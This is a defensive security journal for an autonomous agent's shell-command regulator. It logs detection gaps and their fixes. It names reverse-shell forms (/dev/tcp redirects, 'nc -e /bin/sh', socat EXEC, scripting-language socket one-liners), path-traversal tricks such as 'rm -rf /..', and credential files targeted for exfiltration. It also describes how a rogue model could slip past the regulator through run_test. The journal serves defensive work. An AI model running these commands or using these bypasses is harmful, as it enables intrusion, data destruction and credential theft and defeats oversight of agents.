# Sentinel Security Journal

## 2026-11-06 - Shell Regulator Static Reverse Shell Detection & False Positive Evasions
**Vulnerability:** Shell execution in autonomous mode (`exec_bash`) was vulnerable to interactive reverse shells and socket redirections (`/dev/tcp/...`, `/dev/udp/...`, `nc -e /bin/sh`, and piped netcat shells) because deterministic static inspection lacked patterns for network socket manipulation. Additionally, initial attempts at regex pattern matching suffered from:
1. Substring false positives where flags like `-e` or `-c` matched inside hostnames and parameters (e.g. `test-cluster`, `host-example.org`, `app-client`).
2. Ambient shell execution bypasses where `/dev/tcp/` redirects were executed directly without an explicit preceding `bash` invocation (`exec 5<>/dev/tcp/...`), since `exec_bash` already executes commands within an ambient bash process.
3. Pipe-based reverse shells (`nc host port | /bin/sh` or FIFO redirection) that omit `-e`/`-c` execution flags entirely.

**Learning:** Static regex-based security controls on shell commands must account for shell interpreter context (ambient subshell execution) and enforce strict word/flag boundaries (`\s+(?:-[a-z0-9]*[ec]\b|--(?:sh-)?exec\b)`). Regex matching on virtual shell pseudo-devices like `/dev/tcp/host/port` should not assume a prefixed interpreter command because the runtime shell interpreter is already ambient.

**Prevention:** Always test static regex danger rules against both adversarial bypass permutations (e.g., ambient redirects, pipe chaining) and common benign arguments (hostnames containing flag characters like `cluster` or `example`) to ensure zero false-positive disruption to developer workflows while maintaining complete risk coverage.

## 2026-11-06 - Path Traversal Evasion in Shell Regulator Destructive Removal
**Vulnerability:** In `inspectDestructiveRemoval`, commands executing recursive deletions (`rm -rf`) against root or system directories were checked using raw string prefix/equality checks against `destructiveSystemRoots`. An attacker or rogue model could bypass the detection using path traversal or directory normalization tricks such as `rm -rf /..`, `rm -rf /.`, `rm -rf /./`, `rm -rf /usr/../`, or `rm -rf /var/../etc`, which evaluate directly to `/` or system roots but failed literal string checks.

**Learning:** Pure string prefix matching on filesystem targets inside command-line strings is insufficient for path safety without canonical POSIX path normalization (`path.Clean`).

**Prevention:** Always normalize target path arguments with `path.Clean` before comparing against forbidden directory trees, ensuring traversal sequences like `..` and `.` cannot bypass security boundaries across platforms.

## 2026-11-06 - Test Verifier Shell Gating & Regulator Defense-in-Depth
**Vulnerability:** The test verifier tool (`run_test`) executes shell commands through an ambient bash subshell (`bash -c <command>`), but the regulator's `static_shell` stage only inspected commands where `action.Name == "exec_bash"`. Furthermore, `builtinRunTest` did not perform a preflight `InspectShellRisk` check, allowing dangerous shell commands (reverse shells, destructive deletions, privilege escalation) to bypass static risk inspection when invoked via `run_test`.
**Learning:** Any tool that evaluates arbitrary user/model commands in a shell interpreter constitutes a shell execution surface. Filtering static checks strictly by the primary execution tool name (`exec_bash`) creates an architectural blind spot when auxiliary execution tools (`run_test`) share the underlying interpreter mechanism.
**Prevention:** Unify static shell inspection across all shell-executing actions in the regulator pipeline (`exec_bash`, `run_test`) and enforce defense-in-depth preflight checks inside tool execution entrypoints.

## 2026-11-06 - Static Shell Detection Expansion for Socat Relays & Kubernetes / Netrc Exfiltration
**Vulnerability:** Deterministic static shell risk gating (`InspectShellRisk`) only checked netcat variants (`nc`, `netcat`, `ncat`) for interactive network relay reverse shells and pipes, leaving `socat` unmonitored. Additionally, credential protection covered SSH, AWS, GPG, Docker, and GitHub credentials but omitted `~/.kube/config` (Kubernetes cluster administrator tokens) and `~/.netrc` (plaintext HTTP/FTP credentials).
**Learning:** Adversaries and misaligned autonomous tool calls can substitute `socat` with `EXEC:` parameters or socket-to-interpreter piping when netcat is blocked. Furthermore, cloud-native deployments frequently place high-privilege credentials in `~/.kube` and `~/.netrc` alongside traditional SSH keys.
**Prevention:** Ensure static command inspection catalogs include both classic network relays (`socat`, `nc`) and modern cloud-native credential directories (`~/.kube`, `~/.netrc`) in exfiltration patterns, enforcing strict word boundaries on binary invocations.

## 2026-11-06 - Socat and Scripting Language Socket Reverse Shell Gaps in Static Shell Analysis
**Vulnerability:** Deterministic static inspection in `InspectShellRisk` blocked netcat and `/dev/tcp` redirection but did not detect bidirectional relay tools (`socat` with `exec:`, `system:`, or `pty` parameters) or scripting language one-liners (`python`, `perl`, `ruby` invoking `socket` with descriptor redirection `dup2`/`pty.spawn`/`open STDIN, >&S`).
**Learning:** Network reverse shells commonly pivot to alternative utilities (`socat`) or embedded language runtimes when standard netcat binaries are absent or restricted. Regex detection must inspect both utility-specific command bridges (e.g. `socat` with `exec` or `pty`) and runtime socket redirection semantics while preserving benign script execution (e.g., standard `python -c` or `perl -e` commands).
**Prevention:** Extend static danger patterns to match alternative socket multiplexers and descriptor-duplicating language one-liners, pairing each with negative unit test assertions against benign scripts to eliminate false positives.
